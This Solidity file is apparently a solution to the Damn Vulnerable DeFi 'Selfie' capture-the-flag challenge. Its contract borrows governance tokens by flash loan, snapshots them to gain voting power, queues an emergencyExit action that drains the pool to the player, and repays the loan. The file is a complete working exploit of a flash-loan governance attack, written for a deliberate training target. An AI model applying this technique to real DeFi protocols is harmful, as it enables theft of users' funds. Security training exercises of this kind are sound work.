// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract SelfieReceiver is IERC3156FlashBorrower {
    uint256 public actionId;
    address immutable selfiePool;
    DamnValuableTokenSnapshot private governanceToken;
    address immutable simpleGovernance;
    address immutable player;

    constructor(address _selfiePool, address _governanceToken, address _simpleGovernance, address _player) {
        selfiePool = _selfiePool;
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
        simpleGovernance = _simpleGovernance;
        player = _player;
    }

    // 1 Receiver
        // run() save actionId
        // 1.1. FlashLoan 1.5M
        // receive()
        // 1.2. actionId = queueAction(target=selfiePool, value=0, data=emergencyExit(address receiver=player)
        // 1.3. Transfer DVT from Receiver to SelfiePool
    // 2. Skip time 2 days
    // 3. Call executeAction(actionId)

    function run() external {
        (bool s) = IERC3156FlashLender(selfiePool).flashLoan(IERC3156FlashBorrower(this), address(governanceToken), 1500000 ether, "0x00");
        require(s, "flashLoan failed");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        bytes memory d = abi.encodeWithSignature("emergencyExit(address)", player);
        governanceToken.snapshot();
        console.log("balance:", governanceToken.getBalanceAtLastSnapshot(address(this)));
        actionId = ISimpleGovernance(simpleGovernance).queueAction(selfiePool, 0, d);
        // (bool s) = governanceToken.transfer(selfiePool, amount);
        (bool s) = IERC20(address(governanceToken)).approve(selfiePool, amount);
        require(s, "transfer failed");

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}